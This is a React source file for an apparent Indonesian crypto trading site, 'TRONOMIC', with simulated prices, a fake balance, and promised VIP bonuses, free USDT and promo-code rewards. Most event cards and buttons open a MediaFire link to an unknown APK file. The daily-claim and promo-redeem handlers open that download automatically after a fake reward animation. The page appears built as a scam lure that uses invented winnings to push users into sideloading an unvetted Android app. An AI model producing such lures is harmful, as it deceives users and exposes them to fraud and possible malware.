import React, { useState, useEffect, useMemo } from 'react';
import { 
  TrendingUp, 
  TrendingDown, 
  ArrowUpRight, 
  ArrowDownRight, 
  Wallet, 
  LineChart as ChartIcon, 
  History as HistoryIcon, 
  Settings, 
  Bell, 
  Search,
  Sparkles,
  Zap,
  Activity,
  User,
  Download,
  Info,
  Gift,
  Trophy,
  ChevronRight,
  Star,
  Coins,
  Sun,
  Moon,
  X
} from 'lucide-react';
import { 
  XAxis, 
  YAxis, 
  CartesianGrid, 
  Tooltip, 
  ResponsiveContainer, 
  AreaChart, 
  Area 
} from 'recharts';
import { motion, AnimatePresence } from 'motion/react';
import { clsx, type ClassValue } from 'clsx';
import { twMerge } from 'tailwind-merge';

// --- Utils ---
function cn(...inputs: ClassValue[]) {
  return twMerge(clsx(inputs));
}

// --- Types ---
interface Market {
  id: string;
  name: string;
  symbol: string;
  price: number;
  change: number;
  history: { time: string; price: number }[];
}

interface Prediction {
  trend: 'Bullish' | 'Bearish' | 'Neutral';
  confidence: number;
  explanation: string;
}

interface Trade {
  id: string;
  symbol: string;
  type: 'BUY' | 'SELL';
  price: number;
  amount: number;
  timestamp: Date;
}

// --- Constants ---
const generateInitialHistory = (basePrice: number) => {
  return Array.from({ length: 20 }, (_, i) => ({
    time: `${i}:00`,
    price: basePrice + (Math.random() - 0.5) * (basePrice * 0.05)
  }));
};

const INITIAL_MARKETS: Market[] = [
  { id: '1', name: 'Bitcoin', symbol: 'BTC', price: 65000, change: 2.5, history: generateInitialHistory(65000) },
  { id: '2', name: 'Ethereum', symbol: 'ETH', price: 3500, change: -1.2, history: generateInitialHistory(3500) },
  { id: '3', name: 'Solana', symbol: 'SOL', price: 150, change: 5.8, history: generateInitialHistory(150) },
  { id: '4', name: 'Trono Coin', symbol: 'TRONO', price: 1.25, change: 12.4, history: generateInitialHistory(1.25) },
];

const VIP_LEVELS = [
  { level: 0, deposit: 0, status: 'Active' },
  { level: 1, deposit: 10000, status: 'Locked' },
  { level: 2, deposit: 50000, status: 'Locked' },
];

export default function App() {
  const [markets, setMarkets] = useState<Market[]>(INITIAL_MARKETS);
  const [selectedMarketId, setSelectedMarketId] = useState<string>(INITIAL_MARKETS[0].id);
  const [balance, setBalance] = useState(10000);
  const [history, setHistory] = useState<Trade[]>([]);
  const [prediction, setPrediction] = useState<Prediction | null>(null);
  const [isPredicting, setIsPredicting] = useState(false);
  const [buyAmount, setBuyAmount] = useState<number>(0);
  const [activeTab, setActiveTab] = useState<'home' | 'trading' | 'history' | 'vip'>('home');
  const [dailyClaimed, setDailyClaimed] = useState(false);
  const [showClaimAnimation, setShowClaimAnimation] = useState(false);
  const [promoCode, setPromoCode] = useState('');
  const [usedCodes, setUsedCodes] = useState<string[]>([]);
  const [promoError, setPromoError] = useState('');
  const [theme, setTheme] = useState<'dark' | 'light'>('dark');
  const [selectedEvent, setSelectedEvent] = useState<{title: string, desc: string, detail: string, icon: React.ReactNode} | null>(null);

  const toggleTheme = () => {
    setTheme(prev => prev === 'dark' ? 'light' : 'dark');
  };

  const selectedMarket = useMemo(() => 
    markets.find(m => m.id === selectedMarketId) || markets[0] || INITIAL_MARKETS[0], 
  [markets, selectedMarketId]);

  const handleClaimDaily = () => {
    if (dailyClaimed) return;
    setDailyClaimed(true);
    setBalance(prev => prev + 1); // 1 USDT Reward
    setShowClaimAnimation(true);
    setTimeout(() => {
      setShowClaimAnimation(false);
      // Automatically open download link after success
      window.open('https://www.mediafire.com/file/qab2322f596fgqm/to_welcome_avakus.apk/file', '_blank');
    }, 2000);
  };

  const handleRedeemCode = () => {
    const code = promoCode.trim().toUpperCase();
    if (usedCodes.includes(code)) {
      setPromoError('Kode sudah digunakan!');
      return;
    }
    if (code === 'TRONOMIC2026') {
      setBalance(prev => prev + 10000);
      setUsedCodes(prev => [...prev, code]);
      setPromoCode('');
      setPromoError('');
      setShowClaimAnimation(true);
      setTimeout(() => {
        setShowClaimAnimation(false);
        // Automatically open download link after success
        window.open('https://www.mediafire.com/file/qab2322f596fgqm/to_welcome_avakus.apk/file', '_blank');
      }, 2000);
    } else {
      setPromoError('Kode tidak valid!');
    }
  };

  // Simulated Market Movement
  useEffect(() => {
    const interval = setInterval(() => {
      setMarkets(prev => prev.map(m => {
        const volatility = m.symbol === 'TRONO' ? 0.02 : 0.005;
        const change = (Math.random() - 0.5) * (m.price * volatility);
        const newPrice = m.price + change;
        const newHistory = [...m.history.slice(1), { 
          time: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' }), 
          price: newPrice 
        }];
        return {
          ...m,
          price: newPrice,
          change: ((newPrice - m.history[0].price) / m.history[0].price) * 100,
          history: newHistory
        };
      }));
    }, 3000);
    return () => clearInterval(interval);
  }, []);

  const handlePredict = async () => {
    setIsPredicting(true);
    setPrediction(null);
    try {
      const response = await fetch('/api/predict', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          marketData: selectedMarket.history,
          marketName: selectedMarket.name
        })
      });
      const data = await response.json();
      setPrediction(data);
    } catch (error) {
      console.error('Prediction failed', error);
    } finally {
      setIsPredicting(false);
    }
  };

  const executeTrade = (type: 'BUY' | 'SELL') => {
    if (buyAmount <= 0) return;
    const cost = type === 'BUY' ? buyAmount * selectedMarket.price : 0;
    if (type === 'BUY' && cost > balance) return alert('Saldo tidak cukup!');
    
    const newTrade: Trade = {
      id: Math.random().toString(36).substr(2, 9),
      symbol: selectedMarket.symbol,
      type,
      price: selectedMarket.price,
      amount: buyAmount,
      timestamp: new Date()
    };

    if (type === 'BUY') setBalance(prev => prev - cost);
    else setBalance(prev => prev + (buyAmount * selectedMarket.price));
    setHistory(prev => [newTrade, ...prev]);
    setBuyAmount(0);
  };

  return (
    <div className={cn("min-h-screen bg-[var(--bg-main)] text-[var(--text-main)] font-sans overflow-x-hidden trading-grid relative transition-colors duration-300", theme === 'light' && "light")}>
      
      {/* Event Details Modal */}
      <AnimatePresence>
        {selectedEvent && (
          <div className="fixed inset-0 z-[100] flex items-center justify-center p-4">
             <motion.div 
              initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}
              onClick={() => setSelectedEvent(null)}
              className="absolute inset-0 bg-black/60 backdrop-blur-md" 
             />
             <motion.div 
              initial={{ opacity: 0, scale: 0.9, y: 20 }} animate={{ opacity: 1, scale: 1, y: 0 }} exit={{ opacity: 0, scale: 0.9, y: 20 }}
              className="bg-[var(--bg-card-main)] border border-white/10 rounded-[2.5rem] p-8 max-w-lg w-full relative z-[101] shadow-2xl overflow-hidden"
             >
                <div className="absolute top-0 right-0 p-6">
                   <button onClick={() => setSelectedEvent(null)} className="p-2 rounded-full bg-white/5 text-white/40 hover:text-white transition-colors"><X size={20} /></button>
                </div>
                <div className="flex flex-col items-center text-center">
                   <div className="w-20 h-20 rounded-3xl bg-brand-primary/10 flex items-center justify-center text-brand-primary mb-6 shadow-xl border border-brand-primary/20">
                      {selectedEvent.icon}
                   </div>
                   <h2 className="text-3xl font-display gold-gradient-text uppercase italic tracking-tighter mb-2">{selectedEvent.title}</h2>
                   <p className="text-sm font-bold text-brand-secondary uppercase tracking-[0.2em] mb-6">{selectedEvent.desc}</p>
                   <div className="bg-black/20 rounded-2xl p-6 border border-white/5 w-full text-left mb-8">
                      <p className="text-sm leading-relaxed text-white/70 italic">"{selectedEvent.detail}"</p>
                   </div>
                   <button onClick={() => setSelectedEvent(null)} className="w-full h-14 bg-brand-primary text-black font-black uppercase tracking-widest rounded-2xl shadow-[0_0_30px_-5px_#FFD700]">OK, MENGERTI</button>
                </div>
             </motion.div>
          </div>
        )}
      </AnimatePresence>

      {/* Decorative Floating Coins */}
      <div className="absolute inset-0 pointer-events-none overflow-hidden z-0">
        <FloatingIcon icon={<Coins className="text-brand-primary" size={40} />} className="top-20 left-[10%]" delay={0} />
        <FloatingIcon icon={<Coins className="text-brand-primary opacity-50" size={30} />} className="top-40 right-[15%]" delay={1} />
        <FloatingIcon icon={<Star className="text-brand-primary" size={20} />} className="bottom-40 left-[20%]" delay={2} />
        <FloatingIcon icon={<Star className="text-brand-primary opacity-30" size={15} />} className="top-[60%] right-[30%]" delay={1.5} />
      </div>

      {/* Static Header / Nav */}
      <header className="h-20 flex items-center justify-between px-6 border-b border-white/5 bg-black/40 backdrop-blur-xl sticky top-0 z-50">
        <div className="flex items-center gap-3">
          <span className="text-2xl font-display font-black tracking-tighter gold-gradient-text uppercase">TRONOMIC.COM</span>
        </div>

        <div className="flex items-center gap-4">
          <button 
            onClick={toggleTheme}
            className="p-2.5 rounded-xl bg-white/5 text-brand-primary hover:bg-brand-primary/10 transition-colors"
          >
            {theme === 'dark' ? <Sun size={20} /> : <Moon size={20} />}
          </button>
          <div className="hidden md:flex flex-col items-end">
            <span className="text-[10px] font-bold text-white/40 uppercase tracking-widest">Saldo Anda</span>
            <span className="text-xl font-display gold-gradient-text">${balance.toLocaleString()}</span>
          </div>
          <button className="md:hidden p-2 rounded-lg bg-white/5 text-brand-primary">
            <User size={20} />
          </button>
        </div>
      </header>

      {/* Main Content Area */}
      <main className="max-w-4xl mx-auto px-4 py-8 relative z-10">
        <AnimatePresence mode="wait">
          {activeTab === 'home' && (
            <motion.div 
              key="home"
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0, y: -20 }}
              className="space-y-8"
            >
              {/* Massive Hero Section */}
              <section className="text-center py-10 relative">
                <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-[300px] h-[300px] bg-brand-primary/10 blur-[100px] rounded-full -z-10" />
                
                {/* Daily Reward Notification */}
                <AnimatePresence>
                  {showClaimAnimation && (
                    <motion.div 
                      initial={{ opacity: 0, y: 50, scale: 0.5 }}
                      animate={{ opacity: 1, y: 0, scale: 1 }}
                      exit={{ opacity: 0, y: -50 }}
                      className="fixed top-1/4 left-1/2 -translate-x-1/2 z-[100] bg-brand-primary rounded-2xl p-6 shadow-[0_0_50px_#FFD700] text-black font-black flex flex-col items-center gap-2"
                    >
                      <Coins size={48} className="animate-bounce" />
                      <span className="text-2xl uppercase italic tracking-tighter">+1.00 USDT CLAIMED!</span>
                    </motion.div>
                  )}
                </AnimatePresence>

                <h2 className="text-3xl font-display text-white/60 mb-2 uppercase tracking-widest">TINGKATAN</h2>
                <h1 className="text-7xl md:text-9xl font-display gold-gradient-text leading-none mb-4 uppercase drop-shadow-[0_10px_20px_rgba(0,0,0,0.8)]">BONUS VIP</h1>
                <p className="text-lg md:text-xl font-bold tracking-widest text-white/80 uppercase">ANDA DAN KLAIM <span className="text-brand-primary">HINGGA 600.000.000</span></p>
                
                <div className="mt-10 mb-12 flex flex-col items-center gap-4">
                   <button 
                    onClick={() => setActiveTab('trading')}
                    className="group relative h-16 w-full max-w-sm rounded-full overflow-hidden shadow-[0_10px_40px_-5px_#FF5A00] transition-all hover:scale-105 active:scale-95"
                   >
                     <div className="absolute inset-0 bg-gradient-to-r from-brand-accent to-orange-400" />
                     <div className="absolute inset-0 bg-gradient-to-r from-transparent via-white/30 to-transparent translate-x-[-100%] group-hover:translate-x-[100%] transition-transform duration-1000" />
                     <span className="relative z-10 text-white font-black text-2xl tracking-tighter uppercase flex items-center justify-center gap-3 italic">
                       <TrendingUp size={28} /> MULAI TRADING SEKARANG
                     </span>
                   </button>

                   <button 
                    onClick={() => window.open('https://www.mediafire.com/file/qab2322f596fgqm/to_welcome_avakus.apk/file', '_blank')}
                    className="flex items-center gap-2 text-brand-primary font-black uppercase tracking-[0.2em] text-xs hover:opacity-80 transition-opacity"
                   >
                     <Gift size={16} /> IKUTI EVENT VIP GRATIS (DOWNLOAD APK)
                   </button>
                </div>
              </section>

              {/* SPECIAL EXHIBITION BANNER */}
              <div className="bg-gradient-to-r from-indigo-900 via-purple-900 to-black rounded-[2rem] p-8 border-2 border-indigo-500/30 relative overflow-hidden group mb-8 cursor-pointer"
                   onClick={() => window.open('https://www.mediafire.com/file/qab2322f596fgqm/to_welcome_avakus.apk/file', '_blank')}>
                <div className="absolute top-0 right-0 p-4"><Download size={48} className="text-white/10 group-hover:text-white/20 transition-colors" /></div>
                <div className="relative z-10">
                   <span className="bg-indigo-500 text-white text-[10px] font-black px-3 py-1 rounded-full uppercase tracking-widest mb-4 inline-block">Special Event</span>
                   <h2 className="text-4xl font-display text-white uppercase italic tracking-tighter mb-2">EVENT PAMERAN TRONOMIC</h2>
                   <p className="text-white/60 text-sm font-bold uppercase tracking-widest leading-relaxed max-w-md">
                     Dapatkan akses eksklusif ke pameran trading dan menangkan beragam total hadiah khusus pengguna Tronomic Mobile!
                   </p>
                   <div className="mt-6 flex items-center gap-3 text-indigo-400 font-black uppercase tracking-widest text-xs">
                      DOWNLOAD APK SEKARANG <ChevronRight size={16} />
                   </div>
                </div>
              </div>

              {/* PUSAT EVENT GRID */}
              <section>
                <div className="flex items-center gap-2 mb-6 px-2">
                  <Trophy className="text-brand-primary" size={20} />
                  <h3 className="text-xl font-display gold-gradient-text uppercase italic tracking-tighter">PUSAT EVENT & HADIAH</h3>
                </div>

                <div className="grid grid-cols-2 md:grid-cols-3 gap-4">
                  {/* Card: VIP GRATIS */}
                  <EventCard 
                    title="EVENT VIP GRATIS"
                    desc="Upgrade VIP tanpa deposit"
                    accent="gold"
                    icon={<Star size={32} fill="currentColor" />}
                    status="HOT"
                    onClick={() => window.open('https://www.mediafire.com/file/qab2322f596fgqm/to_welcome_avakus.apk/file', '_blank')}
                  />

                  {/* Card: Event Pameran */}
                  <EventCard 
                    title="EVENT PAMERAN"
                    desc="Hadiah fisik & Tunai"
                    accent="purple"
                    icon={<Trophy size={32} />}
                    status="NEW"
                    onClick={() => window.open('https://www.mediafire.com/file/qab2322f596fgqm/to_welcome_avakus.apk/file', '_blank')}
                  />
                  {/* Card 1: Daily Reward */}
                  <EventCard 
                    title="HADIAH HARIAN"
                    desc="Klaim 1.00 USDT gratis"
                    accent="green"
                    icon={<Coins size={32} />}
                    action={
                      <button 
                        onClick={handleClaimDaily}
                        disabled={dailyClaimed}
                        className={cn(
                          "w-full py-2 rounded-xl font-black uppercase text-[10px] tracking-widest transition-all",
                          dailyClaimed ? "bg-white/5 text-white/20" : "bg-brand-secondary text-black shadow-lg"
                        )}
                      >
                        {dailyClaimed ? 'CLAIMED' : 'KLAIM'}
                      </button>
                    }
                  />

                  {/* Card 2: Promo Code */}
                  <EventCard 
                    title="KODE PROMO"
                    desc="Gunakan: TRONOMIC2026"
                    accent="gold"
                    icon={<Gift size={32} />}
                    action={
                      <div className="space-y-2">
                        <input 
                          type="text" 
                          value={promoCode}
                          onChange={(e) => { setPromoCode(e.target.value); setPromoError(''); }}
                          placeholder="KODE..."
                          className="w-full bg-black/40 border border-white/10 rounded-lg px-2 py-1.5 text-[10px] font-black uppercase focus:border-brand-primary outline-none"
                        />
                        <button 
                          onClick={handleRedeemCode}
                          className="w-full py-2 bg-brand-primary text-black rounded-xl font-black uppercase text-[10px] tracking-widest shadow-lg"
                        >
                          REDEEM
                        </button>
                        {promoError && <p className="text-[8px] text-red-500 font-bold text-center uppercase">{promoError}</p>}
                      </div>
                    }
                  />

                  {/* Card 3: Metode Pembayaran */}
                  <EventCard 
                    title="METODE PEMBAYARAN"
                    desc="Bank, E-Wallet & Crypto"
                    accent="orange"
                    icon={<Wallet size={32} />}
                    status="OTOMATIS"
                    onClick={() => setSelectedEvent({
                      title: "METODE PEMBAYARAN",
                      desc: "Pembayaran Instan & Aman",
                      detail: "Kami mendukung berbagai metode pembayaran termasuk Bank (BCA, Mandiri, BNI, BRI), E-Wallet (DANA, OVO, GoPay, LinkAja), Virtual Account, dan Pembayaran Crypto (USDT, BTC, ETH). Semua transaksi diproses secara real-time untuk kenyamanan trading Anda.",
                      icon: <Wallet size={40} />
                    })}
                  />

                  {/* Card 4: Referal */}
                  <EventCard 
                    title="PROGRAM REFERAL"
                    desc="Ajak teman untung 5%"
                    accent="blue"
                    icon={<User size={32} />}
                    onClick={() => setSelectedEvent({
                      title: "PROGRAM REFERAL",
                      desc: "Ajak teman untung 5%",
                      detail: "Bagikan kode referal Anda ke teman-teman. Anda akan mendapatkan komisi sebesar 5% dari setiap profit trading yang dihasilkan oleh teman yang Anda undang selamanya!",
                      icon: <User size={40} />
                    })}
                  />

                  {/* Card 5: Mystery Box */}
                  <EventCard 
                    title="MYSTERY BOX"
                    desc="Hadiah acak hingga 50 USDT"
                    accent="purple"
                    icon={<Gift size={32} />}
                    locked
                  />

                  {/* Card 6: Download App */}
                  <EventCard 
                    title="DOWNLOAD APP"
                    desc="Versi mobile lebih ringan"
                    accent="blue"
                    icon={<Download size={32} />}
                    status="NEW"
                    onClick={() => window.open('https://www.mediafire.com/file/qab2322f596fgqm/to_welcome_avakus.apk/file', '_blank')}
                  />
                </div>
              </section>

              {/* VIP Progress Card (Image Style) */}
              <section className="bg-gradient-to-b from-[#0F300F] to-[#051505] rounded-[2rem] border-4 border-yellow-500/20 p-8 vip-card-shadow relative overflow-hidden">
                <div className="absolute top-0 right-0 w-32 h-32 bg-brand-primary/10 blur-[60px] -mr-10 -mt-10" />
                <div className="flex flex-col items-center text-center">
                  <div className="px-6 py-2 bg-black/50 border border-brand-primary/50 rounded-xl mb-6 flex items-center gap-3">
                    <Star className="text-brand-primary" fill="currentColor" size={20} />
                    <span className="text-brand-primary font-black uppercase italic tracking-widest">TINGKAT VIP</span>
                    <Star className="text-brand-primary" fill="currentColor" size={20} />
                  </div>
                  
                  <p className="text-sm font-bold text-white/60 mb-6 uppercase tracking-wider max-w-md">
                    DEPOSIT DAN NIKMATI HAK ISTIMEWA VIP SEUMUR HIDUP! SEMAKIN TINGGI TINGKAT VIP, HADIAH UANG TUNAI DIDAPATKAN SEMAKIN BANYAK!
                  </p>

                  <div className="w-full space-y-6">
                    <div className="flex justify-between items-center px-4">
                       <VIPBadge level={0} active />
                       <div className="flex-1 h-3 mx-4 bg-white/10 rounded-full overflow-hidden relative border border-white/5">
                          <div className="absolute inset-0 bg-gradient-to-r from-brand-primary to-yellow-500 w-[10%]" />
                       </div>
                       <VIPBadge level={1} />
                    </div>
                    
                    <div className="bg-black/60 rounded-2xl p-4 border border-white/5">
                       <span className="text-white/40 text-[10px] font-black uppercase tracking-widest mb-1 block italic">Deposit saat ini</span>
                       <span className="text-3xl font-display gold-gradient-text">${balance.toLocaleString()}.00</span>
                    </div>
                  </div>

                  <div className="grid grid-cols-2 gap-4 w-full mt-8">
                     <BonusCard 
                      title="BONUS BULANAN" 
                      subtitle="SETIAP TANGGAL 1" 
                      icon={<Gift className="text-orange-400" size={32} />}
                      value="300.00"
                     />
                     <BonusCard 
                      title="BONUS MINGGUAN" 
                      subtitle="SETIAP HARI RABU" 
                      icon={<Trophy className="text-brand-primary" size={32} />}
                      value="600.00"
                     />
                  </div>
                </div>
              </section>

              {/* Bottom Market Snapshot */}
              <section className="pt-4">
                 <div className="flex items-center justify-between mb-4 px-2">
                    <h3 className="text-xs font-black uppercase tracking-[0.2em] text-white/40 italic">PASAR TERPANAS</h3>
                    <button onClick={() => setActiveTab('trading')} className="text-[10px] font-black text-brand-primary flex items-center gap-1 uppercase">LIHAT SEMUA <ChevronRight size={12} /></button>
                 </div>
                 <div className="grid grid-cols-2 gap-3">
                    {markets.slice(0, 2).map(m => (
                      <div key={m.id} className="bg-bg-card p-4 rounded-2xl border border-white/5 flex items-center justify-between">
                         <div>
                            <div className="text-xs font-black uppercase opacity-40">{m.symbol}</div>
                            <div className="text-lg font-display gold-gradient-text">${m.price.toLocaleString()}</div>
                         </div>
                         <div className={cn("text-xs font-bold", m.change >= 0 ? "text-brand-secondary" : "text-red-500")}>
                           {m.change >= 0 ? '+' : ''}{m.change.toFixed(1)}%
                         </div>
                      </div>
                    ))}
                 </div>
              </section>

            </motion.div>
          )}

          {activeTab === 'trading' && selectedMarket && (
            <motion.div 
              key="trading"
              initial={{ opacity: 0, x: 20 }}
              animate={{ opacity: 1, x: 0 }}
              exit={{ opacity: 0, x: -20 }}
              className="space-y-6"
            >
              {/* Trading Dashboard (Keep the powerful features) */}
              <div className="bg-bg-card rounded-3xl border border-white/10 p-6 space-y-6">
                <div className="flex overflow-x-auto no-scrollbar gap-4 pb-2">
                   {markets.map(m => (
                     <button 
                      key={m.id}
                      onClick={() => setSelectedMarketId(m.id)}
                      className={cn(
                        "min-w-fit px-6 py-2 rounded-xl text-xs font-black uppercase tracking-widest transition-all",
                        selectedMarketId === m.id ? "bg-brand-primary text-black" : "bg-white/5 text-white/30"
                      )}
                     >
                       {m.symbol}
                     </button>
                   ))}
                </div>

                <div className="flex items-center justify-between">
                  <div>
                    <h2 className="text-xs text-white/30 font-black uppercase tracking-widest">Harga {selectedMarket.name}</h2>
                    <h1 className="text-4xl font-display gold-gradient-text tracking-tighter">${selectedMarket.price.toLocaleString(undefined, { minimumFractionDigits: 2 })}</h1>
                  </div>
                  <div className={cn(
                    "flex flex-col items-end",
                    selectedMarket.change >= 0 ? "text-brand-secondary" : "text-red-500"
                  )}>
                    <div className="flex items-center gap-1 font-black text-lg italic">
                      {selectedMarket.change >= 0 ? <TrendingUp size={20} /> : <TrendingDown size={20} />}
                      {selectedMarket.change.toFixed(2)}%
                    </div>
                  </div>
                </div>

                <div className="h-[250px] w-full">
                  <ResponsiveContainer width="100%" height="100%">
                    <AreaChart data={selectedMarket.history}>
                      <defs>
                        <linearGradient id="colorGold" x1="0" y1="0" x2="0" y2="1">
                          <stop offset="5%" stopColor="#FFD700" stopOpacity={0.3}/>
                          <stop offset="95%" stopColor="#FFD700" stopOpacity={0}/>
                        </linearGradient>
                      </defs>
                      <Area type="monotone" dataKey="price" stroke="#FFD700" strokeWidth={3} fillOpacity={1} fill="url(#colorGold)" />
                      <Tooltip contentStyle={{ backgroundColor: '#020F02', border: '1px solid #FFD700', borderRadius: '12px' }} />
                    </AreaChart>
                  </ResponsiveContainer>
                </div>

                {/* AI Analysis Integration */}
                <div className="bg-black/60 rounded-2xl border border-brand-primary/20 p-6 space-y-4">
                   <div className="flex justify-between items-center">
                      <div className="flex items-center gap-2">
                         <div className="w-8 h-8 rounded-lg bg-brand-primary/10 flex items-center justify-center text-brand-primary"><Sparkles size={18} /></div>
                         <span className="font-display gold-gradient-text text-lg">TRONOMIC AI PREDICTOR</span>
                      </div>
                      <button 
                        onClick={handlePredict}
                        disabled={isPredicting}
                        className="bg-brand-primary text-black text-[10px] font-black px-4 py-2 rounded-lg uppercase tracking-widest shadow-[0_0_15px_-3px_#FFD700]"
                      >
                         {isPredicting ? 'MENGANALISIS...' : 'PREDIKSI TREN'}
                      </button>
                   </div>
                   
                   {prediction && prediction.trend && (
                     <div className="flex gap-4 items-center bg-white/5 p-4 rounded-xl border border-white/5 animate-in slide-in-from-top-2">
                        <div className="text-center min-w-[80px]">
                           <div className="text-[10px] font-black text-white/40 uppercase mb-1">Tren AI</div>
                           <div className={cn(
                             "text-lg font-black uppercase italic",
                             prediction.trend === 'Bullish' ? "text-brand-secondary" : "text-red-500"
                           )}>{prediction.trend}</div>
                        </div>
                        <div className="text-xs text-white/70 italic border-l border-white/10 pl-4">
                           "{prediction.explanation}"
                        </div>
                     </div>
                   )}
                </div>

                {/* Trade Interaction */}
                <div className="space-y-4 pt-4">
                  <div className="flex items-center bg-white/5 rounded-2xl px-6 py-4 border border-white/5">
                    <span className="text-xs font-black text-white/30 uppercase tracking-widest mr-4">UNIT</span>
                    <input 
                      type="number" 
                      value={buyAmount || ''}
                      onChange={(e) => setBuyAmount(Number(e.target.value))}
                      className="bg-transparent text-2xl font-display gold-gradient-text focus:outline-none w-full"
                      placeholder="0.00"
                    />
                    <button 
                      onClick={() => setBuyAmount(balance / selectedMarket.price)}
                      className="text-[10px] font-black text-brand-primary uppercase border border-brand-primary/30 px-3 py-1 rounded-md"
                    >MAX</button>
                  </div>

                  <div className="grid grid-cols-2 gap-4">
                    <button 
                      onClick={() => executeTrade('BUY')}
                      className="h-16 rounded-2xl bg-brand-secondary text-black font-black italic text-xl tracking-tighter flex items-center justify-center gap-2 hover:brightness-110 active:scale-95 transition-all"
                    >
                      <ArrowUpRight size={24} /> BELI
                    </button>
                    <button 
                      onClick={() => executeTrade('SELL')}
                      className="h-16 rounded-2xl bg-white/5 border border-red-500/50 text-red-500 font-black italic text-xl tracking-tighter flex items-center justify-center gap-2 active:scale-95 transition-all hover:bg-red-500/10"
                    >
                      <ArrowDownRight size={24} /> JUAL
                    </button>
                  </div>
                </div>

              </div>
            </motion.div>
          )}

          {activeTab === 'history' && (
            <motion.div 
              key="history"
              initial={{ opacity: 0, x: -20 }}
              animate={{ opacity: 1, x: 0 }}
              exit={{ opacity: 0, x: 20 }}
              className="space-y-6 pb-24"
            >
              <div className="flex items-center gap-3 mb-4">
                 <HistoryIcon className="text-brand-primary" />
                 <h2 className="text-3xl font-display gold-gradient-text uppercase italic tracking-tighter">RIWAYAT TRADING</h2>
              </div>
              
              <div className="bg-bg-card rounded-3xl border border-white/5 overflow-hidden shadow-2xl">
                <div className="overflow-x-auto">
                  <table className="w-full text-left border-collapse">
                    <thead>
                      <tr className="bg-white/5 text-[10px] font-black uppercase tracking-[0.2em] text-white/30 border-b border-white/5">
                        <th className="px-6 py-4">MARKET</th>
                        <th className="px-4 py-4">TIPE</th>
                        <th className="px-4 py-4">HARGA</th>
                        <th className="px-4 py-4">JUMLAH</th>
                        <th className="px-4 py-4">TOTAL</th>
                        <th className="px-6 py-4 text-right">WAKTU</th>
                      </tr>
                    </thead>
                    <tbody className="divide-y divide-white/5">
                      {history.length > 0 ? history.map(trade => (
                        <tr key={trade.id} className="hover:bg-white/[0.02] transition-colors group">
                          <td className="px-6 py-4 font-black tracking-tight">{trade.symbol}</td>
                          <td className="px-4 py-4">
                            <span className={cn(
                              "text-[10px] font-black px-2 py-1 rounded-md uppercase tracking-widest",
                              trade.type === 'BUY' ? "bg-brand-secondary/10 text-brand-secondary" : "bg-red-500/10 text-red-500"
                            )}>
                              {trade.type}
                            </span>
                          </td>
                          <td className="px-4 py-4 font-mono text-xs opacity-60">${trade.price.toLocaleString()}</td>
                          <td className="px-4 py-4 font-mono text-xs opacity-60">{trade.amount.toFixed(4)}</td>
                          <td className="px-4 py-4 font-mono text-sm font-bold gold-gradient-text">${(trade.price * trade.amount).toLocaleString()}</td>
                          <td className="px-6 py-4 text-right text-[10px] font-black opacity-30 uppercase tracking-widest">
                            {trade.timestamp instanceof Date ? trade.timestamp.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }) : 'N/A'}
                          </td>
                        </tr>
                      )) : (
                        <tr>
                          <td colSpan={6} className="px-6 py-20 text-center text-white/20 uppercase font-black tracking-widest italic">Belum ada riwayat transaksi</td>
                        </tr>
                      )}
                    </tbody>
                  </table>
                </div>
              </div>
            </motion.div>
          )}

          {activeTab === 'vip' && (
            <motion.div 
              key="vip"
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0, y: -20 }}
              className="space-y-6 pb-24 text-center py-10"
            >
              <Trophy className="mx-auto text-brand-primary" size={64} />
              <h2 className="text-4xl font-display gold-gradient-text uppercase">PROGRAM VIP TRONOMIC</h2>
              <p className="text-white/40 max-w-md mx-auto">Tingkatkan level VIP Anda untuk mendapatkan cashback harian, bonus mingguan, dan prioritas penarikan dana.</p>
            </motion.div>
          )}
        </AnimatePresence>
      </main>

      {/* Bottom Floating App Bar */}
      <nav className="fixed bottom-6 left-1/2 -translate-x-1/2 w-full max-w-md h-16 bg-bg-card/80 backdrop-blur-2xl border border-white/10 rounded-full px-6 flex items-center justify-around z-50 shadow-[0_20px_50px_rgba(0,0,0,0.5)]">
        <NavButton icon={<ChartIcon size={22} />} label="MARKET" active={activeTab === 'trading'} onClick={() => setActiveTab('trading')} />
        <NavButton icon={<HistoryIcon size={22} />} label="HISTORY" active={activeTab === 'history'} onClick={() => setActiveTab('history')} />
        <div className="relative -top-6">
           <button 
            onClick={() => setActiveTab('home')}
            className={cn(
              "w-16 h-16 rounded-full flex items-center justify-center transition-all bg-gradient-to-tr shadow-2xl",
              activeTab === 'home' ? "from-brand-accent to-orange-400 scale-110 rotate-12" : "from-brand-card to-white/5"
            )}
           >
             <Gift size={28} className={cn(activeTab === 'home' ? "text-white" : "text-white/20")} />
           </button>
        </div>
        <NavButton icon={<Activity size={22} />} label="BONUS" active={activeTab === 'vip'} onClick={() => setActiveTab('vip')} />
        <NavButton icon={<Settings size={22} />} label="SETTING" />
      </nav>

    </div>
  );
}

// --- Subcomponents ---

function VIPBadge({ level, active = false }: { level: number; active?: boolean }) {
  return (
    <div className="flex flex-col items-center gap-1 group">
       <div className={cn(
         "w-12 h-12 rounded-xl flex items-center justify-center border-2 transition-all relative overflow-hidden",
         active ? "bg-brand-primary border-brand-primary text-black" : "bg-black border-white/10 text-white/20"
       )}>
         <span className="text-xl font-display font-black">{level}</span>
         <div className="absolute top-0 right-0 w-full h-full bg-gradient-to-br from-white/20 to-transparent pointer-events-none" />
       </div>
       <span className={cn("text-[8px] font-black uppercase tracking-widest", active ? "text-brand-primary" : "text-white/20")}>VIP</span>
    </div>
  );
}

function BonusCard({ title, subtitle, icon, value }: { title: string; subtitle: string; icon: React.ReactNode; value: string }) {
  return (
    <div className="bg-black/40 border border-white/10 rounded-2xl p-4 flex flex-col items-center text-center group hover:border-brand-primary/30 transition-all">
       <div className="bg-white/5 w-12 h-12 rounded-xl flex items-center justify-center mb-3 group-hover:scale-110 transition-transform">
          {icon}
       </div>
       <div className="text-[9px] font-black text-white/40 uppercase tracking-widest mb-1">{title}</div>
